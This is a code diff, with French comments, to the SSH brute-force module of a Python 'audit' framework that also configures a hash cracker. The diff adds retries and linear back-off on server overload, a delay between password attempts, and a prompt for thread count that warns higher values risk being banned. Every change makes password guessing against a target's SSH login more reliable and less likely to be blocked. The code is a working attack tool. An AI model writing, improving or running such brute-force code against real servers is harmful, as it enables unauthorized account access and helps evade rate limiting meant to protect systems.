@@ -78,7 +78,7 @@ FRAMEWORK_CONFIG = {
             ],
         },
         "ssl_auditor": {"timeout": 4.0},
-        "ssh_brute":   {"timeout": 8,  "max_workers": 4},
+        "ssh_brute":   {"timeout": 10, "max_workers": 1, "delay": 0.3},
         "hash_cracker": {
             "algorithms": ["md5", "sha1", "sha224", "sha256", "sha512"],
             "mutations": True,
@@ -699,21 +699,58 @@ class SshAuditPlugin(BasePlugin):
             findings.append(f"Lecture sshd_config impossible : {e}")
         return findings
 
-    def _try_login(self, target: str, port: int, user: str, password: str, timeout: float) -> bool:
+    def _try_login(self, target: str, port: int, user: str, password: str,
+                   timeout: float, delay: float = 0.3, retries: int = 2) -> bool:
+        """
+        Tente une auth SSH réelle via Paramiko.
+        - Retry sur SSHException / EOFError (serveur saturé = bannière non lue)
+        - Délai entre tentatives pour éviter le rate-limiting
+        - Ne propage jamais d'exception vers l'appelant
+        """
         if not PARAMIKO_OK:
             return False
-        try:
+
+        for attempt in range(retries):
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(target, port=port, username=user, password=password,
-                           timeout=timeout, banner_timeout=timeout,
-                           auth_timeout=timeout, look_for_keys=False, allow_agent=False)
-            client.close()
-            return True
-        except paramiko.AuthenticationException:
-            return False
-        except Exception:
-            return False
+            try:
+                client.connect(
+                    target, port=port,
+                    username=user, password=password,
+                    timeout=timeout,
+                    banner_timeout=timeout + 5,  # plus généreux que le timeout TCP
+                    auth_timeout=timeout,
+                    look_for_keys=False,
+                    allow_agent=False,
+                )
+                client.close()
+                return True
+
+            except paramiko.AuthenticationException:
+                # Mot de passe refusé — résultat définitif, pas de retry utile
+                client.close()
+                return False
+
+            except (
+                paramiko.SSHException,   # "Error reading SSH protocol banner"
+                EOFError,                # connexion coupée brutalement
+                OSError,                 # connexion refusée / timeout réseau
+                socket.error,
+            ):
+                # Serveur surchargé ou connexion rejetée — on retente après délai
+                try: client.close()
+                except Exception: pass
+                if attempt < retries - 1:
+                    time.sleep(delay * (attempt + 1))  # back-off linéaire
+                else:
+                    return False  # abandon après tous les retries
+
+            except Exception:
+                try: client.close()
+                except Exception: pass
+                return False
+
+        return False
 
     def execute(self, config: dict) -> dict:
         cfg    = config["modules"]["ssh_brute"]
@@ -776,7 +813,13 @@ class SshAuditPlugin(BasePlugin):
         else:
             candidates = base_words
 
-        console.print(f"[dim]Candidats : {len(candidates)} — cible : {user}@{target}:{port}[/dim]")
+        workers = int(Prompt.ask(
+            "[bold cyan]Threads simultanés[/bold cyan] [dim](1=sûr, 2-3=rapide, >4=risque de bannissement)[/dim]",
+            default="1"
+        ))
+        delay = cfg["delay"]
+
+        console.print(f"[dim]Candidats : {len(candidates)} — cible : {user}@{target}:{port} — threads : {workers}[/dim]")
 
         found_event = threading.Event()
         cracked     = {"password": None, "attempt_count": 0}
@@ -785,7 +828,7 @@ class SshAuditPlugin(BasePlugin):
         def try_pwd(pwd: str) -> tuple[bool, str]:
             if found_event.is_set():
                 return False, pwd
-            ok = self._try_login(target, port, user, pwd, cfg["timeout"])
+            ok = self._try_login(target, port, user, pwd, cfg["timeout"], delay=delay)
             with lock:
                 cracked["attempt_count"] += 1
             if ok:
@@ -797,7 +840,7 @@ class SshAuditPlugin(BasePlugin):
                       BarColumn(bar_width=35), TextColumn("{task.completed}/{task.total}"),
                       TimeElapsedColumn(), console=console) as prog:
             task = prog.add_task(f"[red]Brute SSH {user}@{target}…", total=len(candidates))
-            with concurrent.futures.ThreadPoolExecutor(max_workers=cfg["max_workers"]) as ex:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
                 futs = {ex.submit(try_pwd, p): p for p in candidates}
                 for fut in concurrent.futures.as_completed(futs):
                     prog.advance(task)
